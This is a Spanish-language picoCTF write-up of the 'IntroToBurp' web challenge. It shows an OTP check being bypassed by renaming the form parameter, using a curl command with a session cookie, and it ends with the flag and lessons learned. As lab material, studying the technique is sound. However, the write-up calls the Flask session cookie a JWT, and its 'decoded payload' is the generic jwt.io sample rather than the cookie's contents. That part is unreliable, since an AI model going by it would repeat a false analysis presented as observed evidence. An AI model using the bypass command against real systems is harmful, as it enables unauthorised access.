# Writeup: IntroToBurp
**Categoría:** Easy
**Fecha de conversión:** 2026-04-24

---

Writeup – IntroToBurp (picoCTF)

Autor: [kr3s4l4]

Dificultad: Fácil

Categoría: Web Exploitation

📝 Descripción del reto


El reto IntroToBurp presenta un sitio web con un formulario de registro que luego solicita un código OTP (One-Time Password) para acceder al dashboard. La flag está oculta tras la verificación del OTP. El objetivo es aprender a usar Burp Suite para interceptar y manipular peticiones HTTP, aprovechando una lógica débil en el servidor.

🔍 Reconocimiento inicial


Accedemos a la URL proporcionada (por ejemplo http://titan.picoctf.net:53100/). La página muestra un formulario de registro con campos: full_name, username, phone_number, city, password.


Al registrarnos, somos redirigidos a /dashboard donde se nos pide introducir un OTP. Si introducimos cualquier valor, obtenemos el mensaje Invalid OTP.

🛠️ Configuración de Burp Suite


```
    Abrimos Burp Suite y configuramos el navegador para usar el proxy 127.0.0.1:8080.

    Activamos la intercepción en Proxy → Intercept.

```

🔄 Flujo de peticiones interceptadas

1. Registro (POST /)

Interceptamos la petición POST a / con los datos del formulario. La enviamos (Forward) y el servidor responde con una redirección 302 a /dashboard, además de establecer una cookie de sesión.


La cookie tiene el formato:

text


session=.eJxNzE0KwyAQBeC7uO5CM0Zjr9EDiMaRhiQa_CGU0rt3QjeF2bzv8ebN5qW92J09DrckdmNzLdG2vGIiRA8GZqM8CKdC5IYL0AhqEsKNfHIYgx90ANrFvm02uR1pthaocpOkuR2UheacG4qHq_XMJVw2gByVni595oQ29d1joYbwd1T1iuXvKft8AQgPM5U.acbO7A.rgNRhcWP9GSHmq4YdunO3rvjkXQ


Observamos que es un JWT (tres partes separadas por puntos). Lo decodificamos en jwt.io y vemos el **payload**:

json


{

```
  "iat": 1516239022,
  "name": "John Doe",
  "admin": true
```

}


Además, hay un campo sin nombre que contiene "1234567890". Esto nos da pistas: el usuario tiene privilegios de administrador.

2. Verificación OTP (POST /dashboard)

Al enviar un OTP cualquiera, Burp captura la petición POST a /dashboard con el parámetro otp=1111. La respuesta es siempre Invalid OTP.

💡 Búsqueda de vulnerabilidad


La pista del reto dice: “Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.”

Esto sugiere que el servidor puede tener una validación frágil. Decidimos probar variaciones en la petición:


```
    Enviar otp= vacío.

    Cambiar el nombre del parámetro a code.

    Cambiar el método a GET.

    Modificar el Content-Type, etc.

```

🚀 Explotación – Bypass del OTP


Con la cookie de sesión obtenida (que contiene admin: true), realizamos la siguiente petición usando curl:

bash


curl -X POST http://titan.picoctf.net:56029/dashboard \

```
     -H "Cookie: session=.eJxNzE0KwyAQBeC7uO5CM0Zjr9EDiMaRhiQa_CGU0rt3QjeF2bzv8ebN5qW92J09DrckdmNzLdG2vGIiRA8GZqM8CKdC5IYL0AhqEsKNfHIYgx90ANrFvm02uR1pthaocpOkuR2UheacG4qHq_XMJVw2gByVni595oQ29d1joYbwd1T1iuXvKft8AQgPM5U.acbO7A.rgNRhcWP9GSHmq4YdunO3rvjkXQ" \
     -d "code=1111"

```

Respuesta obtenida:

text


Welcome, kr3s you sucessfully bypassed the OTP request. 

Your **Flag**: picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}


El parámetro code en lugar de otp provocó que el servidor omitiera la validación del OTP y mostrara directamente el dashboard con la flag.

🔎 Explicación técnica


El fallo radica en una lógica de validación deficiente en el servidor. Es probable que el código backend tenga una estructura similar a:

python


def verify_otp(request):

```
    if 'otp' in request.form:
        # Validar el OTP contra el valor almacenado
        if request.form['otp'] == expected_otp:
            return render_dashboard()
        else:
            return "Invalid OTP"
    else:
        # Si no se envía el parámetro 'otp', se asume que la verificación es exitosa
        return render_dashboard()

```

Al cambiar el nombre del parámetro a code, el diccionario request.form no contiene la clave 'otp', por lo que la condición if 'otp' in request.form es falsa y el servidor salta directamente a render_dashboard(), otorgando acceso sin necesidad de un OTP válido.


Esta vulnerabilidad es común en sistemas que implementan verificaciones de dos factores de manera insegura, confiando únicamente en la presencia del campo en la petición.

🏁 Flag

text


picoCTF{***************}


📚 Lecciones aprendidas


```
    Interceptación y modificación de peticiones: Burp Suite permite manipular parámetros, cabeceras y métodos para descubrir fallos.

    Mangling de requests: Probar variaciones en nombres de campos, métodos HTTP, formatos de datos (JSON, URL-encoded) puede revelar vulnerabilidades de lógica.

    Validación de entradas del lado servidor: No basta con verificar la presencia de un campo; se debe validar su contenido y la integridad del proceso.

    Análisis de cookies JWT: Decodificar el token puede proporcionar información valiosa (roles, credenciales).

```

🛠️ Herramientas utilizadas


```
    Burp Suite (Proxy, Repeater)

    curl (peticiones manuales)

    jwt.io (decodificador de JWT)

    Navegador web (Firefox con proxy)
```

